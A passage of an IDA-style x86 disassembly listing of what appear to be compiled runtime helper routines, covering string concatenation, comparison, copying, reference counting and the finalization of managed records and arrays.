; ---------------------------------------------------------------------------

loc_25E3:                               ; CODE XREF: sub_25C4+18↑j
                inc     edx

loc_25E4:                               ; CODE XREF: sub_25C4+13↑j
                inc     edx

loc_25E5:                               ; CODE XREF: sub_25C4+E↑j
                inc     edx

loc_25E6:                               ; CODE XREF: sub_25C4+9↑j
                mov     ecx, edx
                pop     edx
                sub     ecx, edx

loc_25EB:                               ; CODE XREF: sub_25C4+4↑j
                jmp     sub_2584
sub_25C4        endp

; ---------------------------------------------------------------------------
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_25F4        proc near               ; CODE XREF: sub_30B4+36↓p
                                        ; sub_4480+FC↓p ...
                push    edi
                push    eax
                push    ecx
                mov     edi, edx
                xor     eax, eax
                repne scasb
                jnz     short loc_2601
                not     ecx

loc_2601:                               ; CODE XREF: sub_25F4+9↑j
                pop     eax
                add     ecx, eax
                pop     eax
                pop     edi
                jmp     sub_2584
sub_25F4        endp

; ---------------------------------------------------------------------------
                retn

; =============== S U B R O U T I N E =======================================


sub_260C        proc near               ; CODE XREF: sub_3B00+F↓p
                                        ; sub_3B28+3↓p ...
                test    eax, eax
                jz      short locret_2613
                mov     eax, [eax-4]

locret_2613:                            ; CODE XREF: sub_260C+2↑j
                retn
sub_260C        endp


; =============== S U B R O U T I N E =======================================


sub_2614        proc near               ; CODE XREF: sub_2658+1D↓j
                                        ; sub_2658+6E↓j ...
                test    edx, edx
                jz      short locret_2657
                mov     ecx, [eax]
                test    ecx, ecx
                jz      sub_24E8
                push    ebx
                push    esi
                push    edi
                mov     ebx, eax
                mov     esi, edx
                mov     edi, [ecx-4]
                mov     edx, [esi-4]
                add     edx, edi
                cmp     esi, ecx
                jz      short loc_264C
                call    sub_2934
                mov     eax, esi
                mov     ecx, [esi-4]

loc_263F:                               ; CODE XREF: sub_2614+41↓j
                mov     edx, [ebx]
                add     edx, edi
                call    sub_194C
                pop     edi
                pop     esi
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_264C:                               ; CODE XREF: sub_2614+1F↑j
                call    sub_2934
                mov     eax, [ebx]
                mov     ecx, edi
                jmp     short loc_263F
; ---------------------------------------------------------------------------

locret_2657:                            ; CODE XREF: sub_2614+2↑j
                retn
sub_2614        endp


; =============== S U B R O U T I N E =======================================


sub_2658        proc near               ; CODE XREF: sub_4480+A6↓p
                                        ; sub_4A34+91↓p ...
                test    edx, edx
                jz      short loc_26BD
                test    ecx, ecx
                jz      sub_24E8
                cmp     edx, [eax]
                jz      short loc_26C4
                cmp     ecx, [eax]
                jz      short loc_267A
                push    eax
                push    ecx
                call    sub_24E8
                pop     edx
                pop     eax
                jmp     sub_2614
; ---------------------------------------------------------------------------

loc_267A:                               ; CODE XREF: sub_2658+12↑j
                push    ebx
                push    esi
                push    edi
                mov     ebx, edx
                mov     esi, ecx
                push    eax
                mov     eax, [ebx-4]
                add     eax, [esi-4]
                call    sub_2558
                mov     edi, eax
                mov     edx, eax
                mov     eax, ebx
                mov     ecx, [ebx-4]
                call    sub_194C
                mov     edx, edi
                mov     eax, esi
                mov     ecx, [esi-4]
                add     edx, [ebx-4]
                call    sub_194C
                pop     eax
                mov     edx, edi
                test    edi, edi
                jz      short loc_26B4
                dec     dword ptr [edi-8]

loc_26B4:                               ; CODE XREF: sub_2658+57↑j
                call    sub_24E8
                pop     edi
                pop     esi
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_26BD:                               ; CODE XREF: sub_2658+2↑j
                mov     edx, ecx
                jmp     sub_24E8
; ---------------------------------------------------------------------------

loc_26C4:                               ; CODE XREF: sub_2658+E↑j
                mov     edx, ecx
                jmp     sub_2614
sub_2658        endp

; ---------------------------------------------------------------------------
                retn

; =============== S U B R O U T I N E =======================================


sub_26CC        proc near               ; CODE XREF: sub_4480+10E↓p
                                        ; sub_6334+63↓p ...

var_14          = dword ptr -14h

                push    ebx
                push    esi
                push    edi
                push    edx
                push    eax
                mov     ebx, edx
                xor     edi, edi
                mov     ecx, [esp+edx*4+14h]
                test    ecx, ecx
                jz      short loc_26E9
                cmp     [eax], ecx
                jnz     short loc_26E9
                mov     edi, ecx
                mov     eax, [ecx-4]
                dec     edx
                jmp     short loc_26EB
; ---------------------------------------------------------------------------

loc_26E9:                               ; CODE XREF: sub_26CC+F↑j
                                        ; sub_26CC+13↑j
                xor     eax, eax

loc_26EB:                               ; CODE XREF: sub_26CC+1B↑j
                                        ; sub_26CC+31↓j
                mov     ecx, [esp+edx*4+14h]
                test    ecx, ecx
                jz      short loc_26FC
                add     eax, [ecx-4]
                cmp     edi, ecx
                jnz     short loc_26FC
                xor     edi, edi

loc_26FC:                               ; CODE XREF: sub_26CC+25↑j
                                        ; sub_26CC+2C↑j
                dec     edx
                jnz     short loc_26EB
                test    edi, edi
                jz      short loc_271A
                mov     edx, eax
                mov     eax, [esp+14h+var_14]
                mov     esi, [edi-4]
                call    sub_2934
                mov     edi, [esp+14h+var_14]
                push    dword ptr [edi]
                add     esi, [edi]
                dec     ebx
                jmp     short loc_2722
; ---------------------------------------------------------------------------

loc_271A:                               ; CODE XREF: sub_26CC+35↑j
                call    sub_2558
                push    eax
                mov     esi, eax

loc_2722:                               ; CODE XREF: sub_26CC+4C↑j
                                        ; sub_26CC+6B↓j
                mov     eax, [esp+ebx*4+18h]
                mov     edx, esi
                test    eax, eax
                jz      short loc_2736
                mov     ecx, [eax-4]
                add     esi, ecx
                call    sub_194C

loc_2736:                               ; CODE XREF: sub_26CC+5E↑j
                dec     ebx
                jnz     short loc_2722
                pop     edx
                pop     eax
                test    edi, edi
                jnz     short loc_274B
                test    edx, edx
                jz      short loc_2746
                dec     dword ptr [edx-8]

loc_2746:                               ; CODE XREF: sub_26CC+75↑j
                call    sub_24E8

loc_274B:                               ; CODE XREF: sub_26CC+71↑j
                pop     edx
                pop     edi
                pop     esi
                pop     ebx
                pop     eax
                lea     esp, [esp+edx*4]
                jmp     eax
sub_26CC        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_2758        proc near               ; CODE XREF: sub_41E0+74↓p
                                        ; sub_476C+B8↓p ...
                push    ebx
                push    esi
                push    edi
                mov     esi, eax
                mov     edi, edx
                cmp     eax, edx
                jz      loc_27F6
                test    esi, esi
                jz      short loc_27D3
                test    edi, edi
                jz      short loc_27DA
                mov     eax, [esi-4]
                mov     edx, [edi-4]
                sub     eax, edx
                ja      short loc_277B
                add     edx, eax

loc_277B:                               ; CODE XREF: sub_2758+1F↑j
                push    edx
                shr     edx, 2
                jz      short loc_27A7

loc_2781:                               ; CODE XREF: sub_2758+45↓j
                mov     ecx, [esi]
                mov     ebx, [edi]
                cmp     ecx, ebx
                jnz     short loc_27E1
                dec     edx
                jz      short loc_27A1
                mov     ecx, [esi+4]
                mov     ebx, [edi+4]
                cmp     ecx, ebx
                jnz     short loc_27E1
                add     esi, 8
                add     edi, 8
                dec     edx
                jnz     short loc_2781
                jmp     short loc_27A7
; ---------------------------------------------------------------------------

loc_27A1:                               ; CODE XREF: sub_2758+32↑j
                add     esi, 4
                add     edi, 4

loc_27A7:                               ; CODE XREF: sub_2758+27↑j
                                        ; sub_2758+47↑j
                pop     edx
                and     edx, 3
                jz      short loc_27CF
                mov     ecx, [esi]
                mov     ebx, [edi]
                cmp     cl, bl
                jnz     short loc_27F6
                dec     edx
                jz      short loc_27CF
                cmp     ch, bh
                jnz     short loc_27F6
                dec     edx
                jz      short loc_27CF
                and     ebx, 0FF0000h
                and     ecx, 0FF0000h
                cmp     ecx, ebx
                jnz     short loc_27F6

loc_27CF:                               ; CODE XREF: sub_2758+53↑j
                                        ; sub_2758+5E↑j ...
                add     eax, eax
                jmp     short loc_27F6
; ---------------------------------------------------------------------------

loc_27D3:                               ; CODE XREF: sub_2758+11↑j
                mov     edx, [edi-4]
                sub     eax, edx
                jmp     short loc_27F6
; ---------------------------------------------------------------------------

loc_27DA:                               ; CODE XREF: sub_2758+15↑j
                mov     eax, [esi-4]
                sub     eax, edx
                jmp     short loc_27F6
; ---------------------------------------------------------------------------

loc_27E1:                               ; CODE XREF: sub_2758+2F↑j
                                        ; sub_2758+3C↑j
                pop     edx
                cmp     cl, bl
                jnz     short loc_27F6
                cmp     ch, bh
                jnz     short loc_27F6
                shr     ecx, 10h
                shr     ebx, 10h
                cmp     cl, bl
                jnz     short loc_27F6
                cmp     ch, bh

loc_27F6:                               ; CODE XREF: sub_2758+9↑j
                                        ; sub_2758+5B↑j ...
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_2758        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_27FC        proc near               ; CODE XREF: sub_41E0+10↓p
                                        ; sub_4480+27↓p ...
                test    eax, eax
                jz      short locret_280A
                mov     edx, [eax-8]
                inc     edx
                jle     short locret_280A
                lock inc dword ptr [eax-8]

locret_280A:                            ; CODE XREF: sub_27FC+2↑j
                                        ; sub_27FC+8↑j
                retn
sub_27FC        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_280C        proc near               ; CODE XREF: sub_3C08+12↓p
                                        ; sub_42B0+7↓p ...
                test    eax, eax
                jz      short loc_2812
                retn
; ---------------------------------------------------------------------------
                align 2

loc_2812:                               ; CODE XREF: sub_280C+2↑j
                mov     eax, 403411h
                retn
sub_280C        endp


; =============== S U B R O U T I N E =======================================


sub_2818        proc near               ; CODE XREF: sub_285C↓j
                mov     edx, [eax]
                test    edx, edx
                jz      short loc_2856
                mov     ecx, [edx-8]
                dec     ecx
                jz      short loc_2856
                push    ebx
                mov     ebx, eax
                mov     eax, [edx-4]
                call    sub_2558
                mov     edx, eax
                mov     eax, [ebx]
                mov     [ebx], edx
                push    eax
                mov     ecx, [eax-4]
                call    sub_194C
                pop     eax
                mov     ecx, [eax-8]
                dec     ecx
                jl      short loc_2853
                lock dec dword ptr [eax-8]
                jnz     short loc_2853
                lea     eax, [eax-8]
                call    sub_1868

loc_2853:                               ; CODE XREF: sub_2818+2B↑j
                                        ; sub_2818+31↑j
                mov     edx, [ebx]
                pop     ebx

loc_2856:                               ; CODE XREF: sub_2818+4↑j
                                        ; sub_2818+A↑j
                mov     eax, edx
                retn
sub_2818        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_285C        proc near               ; CODE XREF: sub_28A4+9↓p
                                        ; sub_3B00+9↓p
                jmp     sub_2818
sub_285C        endp

; ---------------------------------------------------------------------------
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_2864        proc near               ; CODE XREF: sub_3B28+1F↓p
                                        ; sub_3B98+23↓p ...

arg_0           = dword ptr  4

                push    ebx
                test    eax, eax
                jz      short loc_2896
                mov     ebx, [eax-4]
                test    ebx, ebx
                jz      short loc_2896
                dec     edx
                jl      short loc_288E
                cmp     edx, ebx
                jge     short loc_2896

loc_2877:                               ; CODE XREF: sub_2864+2C↓j
                sub     ebx, edx
                test    ecx, ecx
                jl      short loc_2896
                cmp     ecx, ebx
                jg      short loc_2892

loc_2881:                               ; CODE XREF: sub_2864+30↓j
                add     edx, eax
                mov     eax, [esp+4+arg_0]
                call    sub_2584
                jmp     short loc_289F
; ---------------------------------------------------------------------------

loc_288E:                               ; CODE XREF: sub_2864+D↑j
                xor     edx, edx
                jmp     short loc_2877
; ---------------------------------------------------------------------------

loc_2892:                               ; CODE XREF: sub_2864+1B↑j
                mov     ecx, ebx
                jmp     short loc_2881
; ---------------------------------------------------------------------------

loc_2896:                               ; CODE XREF: sub_2864+3↑j
                                        ; sub_2864+A↑j ...
                mov     eax, [esp+4+arg_0]
                call    sub_2494

loc_289F:                               ; CODE XREF: sub_2864+28↑j
                pop     ebx
                retn    4
sub_2864        endp

; ---------------------------------------------------------------------------
                retn

; =============== S U B R O U T I N E =======================================


sub_28A4        proc near               ; CODE XREF: sub_4108+36↓p
                push    ebx
                push    esi
                push    edi
                mov     ebx, eax
                mov     esi, edx
                mov     edi, ecx
                call    sub_285C
                mov     edx, [ebx]
                test    edx, edx
                jz      short loc_28E8
                mov     ecx, [edx-4]
                dec     esi
                jl      short loc_28E8
                cmp     esi, ecx
                jge     short loc_28E8
                test    edi, edi
                jle     short loc_28E8
                sub     ecx, esi
                cmp     edi, ecx
                jle     short loc_28CE
                mov     edi, ecx

loc_28CE:                               ; CODE XREF: sub_28A4+26↑j
                sub     ecx, edi
                add     edx, esi
                lea     eax, [edi+edx]
                call    sub_194C
                mov     edx, [ebx]
                mov     eax, ebx
                mov     edx, [edx-4]
                sub     edx, edi
                call    sub_2934

loc_28E8:                               ; CODE XREF: sub_28A4+12↑j
                                        ; sub_28A4+18↑j ...
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_28A4        endp


; =============== S U B R O U T I N E =======================================


sub_28EC        proc near               ; CODE XREF: sub_65D0+FD↓p
                test    eax, eax
                jz      short locret_2930
                test    edx, edx
                jz      short loc_2925
                push    ebx
                push    esi
                push    edi
                mov     esi, eax
                mov     edi, edx
                mov     ecx, [edi-4]
                push    edi
                mov     edx, [esi-4]
                dec     edx
                js      short loc_2920
                mov     al, [esi]
                inc     esi
                sub     ecx, edx
                jle     short loc_2920

loc_290C:                               ; CODE XREF: sub_28EC+32↓j
                repne scasb
                jnz     short loc_2920
                mov     ebx, ecx
                push    esi
                push    edi
                mov     ecx, edx
                repe cmpsb
                pop     edi
                pop     esi
                jz      short loc_2928
                mov     ecx, ebx
                jmp     short loc_290C
; ---------------------------------------------------------------------------

loc_2920:                               ; CODE XREF: sub_28EC+17↑j
                                        ; sub_28EC+1E↑j ...
                pop     edx
                xor     eax, eax
                jmp     short loc_292D
; ---------------------------------------------------------------------------

loc_2925:                               ; CODE XREF: sub_28EC+6↑j
                xor     eax, eax
                retn
; ---------------------------------------------------------------------------

loc_2928:                               ; CODE XREF: sub_28EC+2E↑j
                pop     edx
                mov     eax, edi
                sub     eax, edx

loc_292D:                               ; CODE XREF: sub_28EC+37↑j
                pop     edi
                pop     esi
                pop     ebx

locret_2930:                            ; CODE XREF: sub_28EC+2↑j
                retn
sub_28EC        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_2934        proc near               ; CODE XREF: sub_2614+21↑p
                                        ; sub_2614:loc_264C↑p ...
                push    ebx
                push    esi
                push    edi
                mov     ebx, eax
                mov     esi, edx
                xor     edi, edi
                test    edx, edx
                jle     short loc_2989
                mov     eax, [ebx]
                test    eax, eax
                jz      short loc_296A
                cmp     dword ptr [eax-8], 1
                jnz     short loc_296A
                sub     eax, 8
                add     edx, 9
                push    eax
                mov     eax, esp
                call    sub_1888
                pop     eax
                add     eax, 8
                mov     [ebx], eax
                mov     [eax-4], esi
                mov     byte ptr [esi+eax], 0
                jmp     short loc_2992
; ---------------------------------------------------------------------------

loc_296A:                               ; CODE XREF: sub_2934+11↑j
                                        ; sub_2934+17↑j
                mov     eax, edx
                call    sub_2558
                mov     edi, eax
                mov     eax, [ebx]
                test    eax, eax
                jz      short loc_2989
                mov     edx, edi
                mov     ecx, [eax-4]
                cmp     ecx, esi
                jl      short loc_2984
                mov     ecx, esi

loc_2984:                               ; CODE XREF: sub_2934+4C↑j
                call    sub_194C

loc_2989:                               ; CODE XREF: sub_2934+B↑j
                                        ; sub_2934+43↑j
                mov     eax, ebx
                call    sub_2494
                mov     [ebx], edi

loc_2992:                               ; CODE XREF: sub_2934+34↑j
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_2934        endp

; ---------------------------------------------------------------------------
                align 4
; START OF FUNCTION CHUNK FOR sub_29DC

loc_2998:                               ; CODE XREF: sub_29DC+1D↓j
                mov     al, 1
                jmp     sub_1930
; END OF FUNCTION CHUNK FOR sub_29DC
; ---------------------------------------------------------------------------
                retn

; =============== S U B R O U T I N E =======================================


sub_29A0        proc near               ; CODE XREF: sub_29DC+2↓j
                                        ; sub_29DC+D↓j ...
                mov     edx, [eax]
                test    edx, edx
                jz      short locret_29B4
                mov     dword ptr [eax], 0
                push    eax
                push    edx
                call    sub_480
                pop     eax

locret_29B4:                            ; CODE XREF: sub_29A0+4↑j
                retn
sub_29A0        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_29B8        proc near               ; CODE XREF: sub_2A4C+70↓p
                push    ebx
                push    esi
                mov     ebx, eax
                mov     esi, edx

loc_29BE:                               ; CODE XREF: sub_29B8+1C↓j
                mov     eax, [ebx]
                test    eax, eax
                jz      short loc_29D0
                mov     dword ptr [ebx], 0
                push    eax
                call    sub_480

loc_29D0:                               ; CODE XREF: sub_29B8+A↑j
                add     ebx, 4
                dec     esi
                jnz     short loc_29BE
                pop     esi
                pop     ebx
                retn
sub_29B8        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_29DC        proc near               ; CODE XREF: sub_2B50+81↓p
                                        ; sub_2C6C+61↓p

; FUNCTION CHUNK AT 00002998 SIZE 00000007 BYTES

                test    edx, edx
                jz      sub_29A0
                mov     ecx, [edx-4]
                shr     ecx, 1
                jz      sub_29A0
                push    ecx
                push    edx
                push    eax
                call    sub_478
                test    eax, eax
                jz      loc_2998
                retn
sub_29DC        endp


; =============== S U B R O U T I N E =======================================


sub_2A00        proc near               ; CODE XREF: sub_2A4C+AF↓p
                xor     ecx, ecx
                push    ebx
                mov     cl, [edx+1]
                push    esi
                push    edi
                mov     ebx, eax
                lea     esi, [ecx+edx+0Ah]
                mov     edi, [ecx+edx+6]

loc_2A12:                               ; CODE XREF: sub_2A00+29↓j
                mov     edx, [esi]
                mov     eax, [esi+4]
                add     eax, ebx
                mov     edx, [edx]
                mov     ecx, 1
                call    sub_2A4C
                add     esi, 8
                dec     edi
                jg      short loc_2A12
                mov     eax, ebx
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_2A00        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_2A34        proc near               ; CODE XREF: sub_2A4C+7C↓p
                cmp     dword ptr ds:409010h, 0
                jz      short loc_2A44
                call    dword ptr ds:409010h
                retn
; ---------------------------------------------------------------------------

loc_2A44:                               ; CODE XREF: sub_2A34+7↑j
                mov     al, 10h
                call    sub_1930
sub_2A34        endp

; ---------------------------------------------------------------------------
                retn

; =============== S U B R O U T I N E =======================================


sub_2A4C        proc near               ; CODE XREF: sub_2A00+20↑p
                                        ; sub_2A4C+99↓p ...
                cmp     ecx, 0
                jz      locret_2B35
                push    eax
                push    ebx
                push    esi
                push    edi
                mov     ebx, eax
                mov     esi, edx
                mov     edi, ecx
                xor     edx, edx
                mov     al, [esi]
                mov     dl, [esi+1]
                cmp     al, 0Ah
                jz      short loc_2A8F
                cmp     al, 0Bh
                jz      short loc_2AAC
                cmp     al, 0Ch
                jz      short loc_2AC3
                cmp     al, 0Dh
                jz      short loc_2AD2
                cmp     al, 0Eh
                jz      short loc_2AF0
                cmp     al, 0Fh
                jz      loc_2B06
                cmp     al, 11h
                jz      loc_2B15
                jmp     loc_2B26
; ---------------------------------------------------------------------------

loc_2A8F:                               ; CODE XREF: sub_2A4C+1C↑j
                cmp     ecx, 1
                mov     eax, ebx
                jg      short loc_2AA0
                call    sub_2494
                jmp     loc_2B31
; ---------------------------------------------------------------------------

loc_2AA0:                               ; CODE XREF: sub_2A4C+48↑j
                mov     edx, ecx
                call    sub_24B8
                jmp     loc_2B31
; ---------------------------------------------------------------------------

loc_2AAC:                               ; CODE XREF: sub_2A4C+20↑j
                cmp     ecx, 1
                mov     eax, ebx
                jg      short loc_2ABA
                call    sub_29A0
                jmp     short loc_2B31
; ---------------------------------------------------------------------------

loc_2ABA:                               ; CODE XREF: sub_2A4C+65↑j
                mov     edx, ecx
                call    sub_29B8
                jmp     short loc_2B31
; ---------------------------------------------------------------------------

loc_2AC3:                               ; CODE XREF: sub_2A4C+24↑j
                                        ; sub_2A4C+82↓j
                mov     eax, ebx
                add     ebx, 10h
                call    sub_2A34
                dec     edi
                jg      short loc_2AC3
                jmp     short loc_2B31
; ---------------------------------------------------------------------------

loc_2AD2:                               ; CODE XREF: sub_2A4C+28↑j
                push    ebp
                mov     ebp, edx

loc_2AD5:                               ; CODE XREF: sub_2A4C+9F↓j
                mov     edx, [esi+ebp+0Ah]
                mov     eax, ebx
                add     ebx, [esi+ebp+2]
                mov     ecx, [esi+ebp+6]
                mov     edx, [edx]
                call    sub_2A4C
                dec     edi
                jg      short loc_2AD5
                pop     ebp
                jmp     short loc_2B31
; ---------------------------------------------------------------------------

loc_2AF0:                               ; CODE XREF: sub_2A4C+2C↑j
                push    ebp
                mov     ebp, edx

loc_2AF3:                               ; CODE XREF: sub_2A4C+B5↓j
                mov     eax, ebx
                add     ebx, [esi+ebp+2]
                mov     edx, esi
                call    sub_2A00
                dec     edi
                jg      short loc_2AF3
                pop     ebp
                jmp     short loc_2B31
; ---------------------------------------------------------------------------

loc_2B06:                               ; CODE XREF: sub_2A4C+30↑j
                                        ; sub_2A4C+C5↓j
                mov     eax, ebx
                add     ebx, 4
                call    sub_3070
                dec     edi
                jg      short loc_2B06
                jmp     short loc_2B31
; ---------------------------------------------------------------------------

loc_2B15:                               ; CODE XREF: sub_2A4C+38↑j
                                        ; sub_2A4C+D6↓j
                mov     eax, ebx
                mov     edx, esi
                add     ebx, 4
                call    sub_2F30
                dec     edi
                jg      short loc_2B15
                jmp     short loc_2B31
; ---------------------------------------------------------------------------

loc_2B26:                               ; CODE XREF: sub_2A4C+3E↑j
                pop     edi
                pop     esi
                pop     ebx
                pop     eax
                mov     al, 2
                jmp     sub_1930
; ---------------------------------------------------------------------------

loc_2B31:                               ; CODE XREF: sub_2A4C+4F↑j
                                        ; sub_2A4C+5B↑j ...
                pop     edi
                pop     esi
                pop     ebx
                pop     eax

locret_2B35:                            ; CODE XREF: sub_2A4C+3↑j
                retn
sub_2A4C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_2B38        proc near               ; CODE XREF: sub_2B50+92↓p
                                        ; sub_2C6C+75↓p
                cmp     dword ptr ds:409014h, 0
                jz      short loc_2B48
                call    dword ptr ds:409014h
                retn
; ---------------------------------------------------------------------------

loc_2B48:                               ; CODE XREF: sub_2B38+7↑j
                mov     al, 10h
                call    sub_1930
sub_2B38        endp

; ---------------------------------------------------------------------------
                retn

; =============== S U B R O U T I N E =======================================


sub_2B50        proc near               ; CODE XREF: sub_2B50+CF↓p
                                        ; sub_2C6C+AC↓p
                push    ebx
                push    esi
                push    edi
                push    ebp
                mov     ebx, eax
                mov     esi, edx
                xor     eax, eax
                mov     al, [ecx+1]
                lea     edi, [eax+ecx+0Ah]
                mov     ebp, [edi-4]
                xor     eax, eax
                mov     ecx, [edi-8]
                push    ecx

loc_2B6A:                               ; CODE XREF: sub_2B50+100↓j
                mov     ecx, [edi+4]
                sub     ecx, eax
                jle     short loc_2B7C
                mov     edx, eax
                add     eax, esi
                add     edx, ebx
                call    sub_194C

loc_2B7C:                               ; CODE XREF: sub_2B50+1F↑j
                mov     eax, [edi+4]
                mov     edx, [edi]
                mov     edx, [edx]
                mov     cl, [edx]
                cmp     cl, 0Ah
                jz      short loc_2BBB
                cmp     cl, 0Bh
                jz      short loc_2BCC
                cmp     cl, 0Ch
                jz      short loc_2BDD
                cmp     cl, 0Dh
                jz      short loc_2BEE
                cmp     cl, 0Eh
                jz      short loc_2C0E
                cmp     cl, 0Fh
                jz      loc_2C27
                cmp     cl, 11h
                jz      loc_2C38
                mov     al, 2
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                jmp     sub_1930
; ---------------------------------------------------------------------------

loc_2BBB:                               ; CODE XREF: sub_2B50+38↑j
                mov     edx, [eax+esi]
                add     eax, ebx
                call    sub_24E8
                mov     eax, 4
                jmp     short loc_2C49
; ---------------------------------------------------------------------------

loc_2BCC:                               ; CODE XREF: sub_2B50+3D↑j
                mov     edx, [eax+esi]
                add     eax, ebx
                call    sub_29DC
                mov     eax, 4
                jmp     short loc_2C49
; ---------------------------------------------------------------------------

loc_2BDD:                               ; CODE XREF: sub_2B50+42↑j
                lea     edx, [eax+esi]
                add     eax, ebx
                call    sub_2B38
                mov     eax, 10h
                jmp     short loc_2C49
; ---------------------------------------------------------------------------

loc_2BEE:                               ; CODE XREF: sub_2B50+47↑j
                xor     ecx, ecx
                mov     cl, [edx+1]
                push    dword ptr [ecx+edx+2]
                push    dword ptr [ecx+edx+6]
                mov     ecx, [ecx+edx+0Ah]
                mov     ecx, [ecx]
                lea     edx, [eax+esi]
                add     eax, ebx
                call    sub_2C6C
                pop     eax
                jmp     short loc_2C49
; ---------------------------------------------------------------------------

loc_2C0E:                               ; CODE XREF: sub_2B50+4C↑j
                xor     ecx, ecx
                mov     cl, [edx+1]
                mov     ecx, [ecx+edx+2]
                push    ecx
                mov     ecx, edx
                lea     edx, [eax+esi]
                add     eax, ebx
                call    sub_2B50
                pop     eax
                jmp     short loc_2C49
; ---------------------------------------------------------------------------

loc_2C27:                               ; CODE XREF: sub_2B50+51↑j
                mov     edx, [eax+esi]
                add     eax, ebx
                call    sub_3088
                mov     eax, 4
                jmp     short loc_2C49
; ---------------------------------------------------------------------------

loc_2C38:                               ; CODE XREF: sub_2B50+5A↑j
                mov     ecx, edx
                mov     edx, [eax+esi]
                add     eax, ebx
                call    sub_2F6C
                mov     eax, 4

loc_2C49:                               ; CODE XREF: sub_2B50+7A↑j
                                        ; sub_2B50+8B↑j ...
                add     eax, [edi+4]
                add     edi, 8
                dec     ebp
                jnz     loc_2B6A
                pop     ecx
                sub     ecx, eax
                jle     short loc_2C65
                lea     edx, [eax+ebx]
                add     eax, esi
                call    sub_194C

loc_2C65:                               ; CODE XREF: sub_2B50+109↑j
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_2B50        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_2C6C        proc near               ; CODE XREF: sub_2B50+B6↑p
                                        ; sub_2C6C+98↓p ...

arg_0           = dword ptr  4

                push    ebx
                push    esi
                push    edi
                push    ebp
                mov     ebx, eax
                mov     esi, edx
                mov     edi, ecx
                mov     ebp, [esp+10h+arg_0]
                mov     cl, [edi]
                cmp     cl, 0Ah
                jz      short loc_2CB2
                cmp     cl, 0Bh
                jz      short loc_2CC9
                cmp     cl, 0Ch
                jz      short loc_2CDD
                cmp     cl, 0Dh
                jz      short loc_2CF1
                cmp     cl, 0Eh
                jz      short loc_2D12
                cmp     cl, 0Fh
                jz      loc_2D2F
                cmp     cl, 11h
                jz      loc_2D43
                mov     al, 2
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                jmp     sub_1930
; ---------------------------------------------------------------------------

loc_2CB2:                               ; CODE XREF: sub_2C6C+13↑j
                                        ; sub_2C6C+56↓j
                mov     eax, ebx
                mov     edx, [esi]
                call    sub_24E8
                add     ebx, 4
                add     esi, 4
                dec     ebp
                jnz     short loc_2CB2
                jmp     loc_2D57
; ---------------------------------------------------------------------------

loc_2CC9:                               ; CODE XREF: sub_2C6C+18↑j
                                        ; sub_2C6C+6D↓j
                mov     eax, ebx
                mov     edx, [esi]
                call    sub_29DC
                add     ebx, 4
                add     esi, 4
                dec     ebp
                jnz     short loc_2CC9
                jmp     short loc_2D57
; ---------------------------------------------------------------------------

loc_2CDD:                               ; CODE XREF: sub_2C6C+1D↑j
                                        ; sub_2C6C+81↓j
                mov     eax, ebx
                mov     edx, esi
                call    sub_2B38
                add     ebx, 10h
                add     esi, 10h
                dec     ebp
                jnz     short loc_2CDD
                jmp     short loc_2D57
; ---------------------------------------------------------------------------

loc_2CF1:                               ; CODE XREF: sub_2C6C+22↑j
                xor     ecx, ecx
                mov     cl, [edi+1]
                lea     edi, [ecx+edi+2]

loc_2CFA:                               ; CODE XREF: sub_2C6C+A2↓j
                mov     eax, ebx
                mov     edx, esi
                mov     ecx, [edi+8]
                push    dword ptr [edi+4]
                call    sub_2C6C
                add     ebx, [edi]
                add     esi, [edi]
                dec     ebp
                jnz     short loc_2CFA
                jmp     short loc_2D57
; ---------------------------------------------------------------------------

loc_2D12:                               ; CODE XREF: sub_2C6C+27↑j
                                        ; sub_2C6C+BF↓j
                mov     eax, ebx
                mov     edx, esi
                mov     ecx, edi
                call    sub_2B50
                xor     eax, eax
                mov     al, [edi+1]
                add     ebx, [eax+edi+2]
                add     esi, [eax+edi+2]
                dec     ebp
                jnz     short loc_2D12
                jmp     short loc_2D57
; ---------------------------------------------------------------------------

loc_2D2F:                               ; CODE XREF: sub_2C6C+2C↑j
                                        ; sub_2C6C+D3↓j
                mov     eax, ebx
                mov     edx, [esi]
                call    sub_3088
                add     ebx, 4
                add     esi, 4
                dec     ebp
                jnz     short loc_2D2F
                jmp     short loc_2D57
; ---------------------------------------------------------------------------

loc_2D43:                               ; CODE XREF: sub_2C6C+35↑j
                                        ; sub_2C6C+E9↓j
                mov     eax, ebx
                mov     edx, [esi]
                mov     ecx, edi
                call    sub_2F6C
                add     ebx, 4
                add     esi, 4
                dec     ebp
                jnz     short loc_2D43

loc_2D57:                               ; CODE XREF: sub_2C6C+58↑j
                                        ; sub_2C6C+6F↑j ...
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn    4
sub_2C6C        endp

; ---------------------------------------------------------------------------
                retn
; ---------------------------------------------------------------------------
                align 10h
                mov     al, 11h
                jmp     sub_1930
; ---------------------------------------------------------------------------
                retn

; =============== S U B R O U T I N E =======================================


sub_2D68        proc near               ; CODE XREF: sub_2D70↓p
                test    eax, eax
                jz      short locret_2D6F
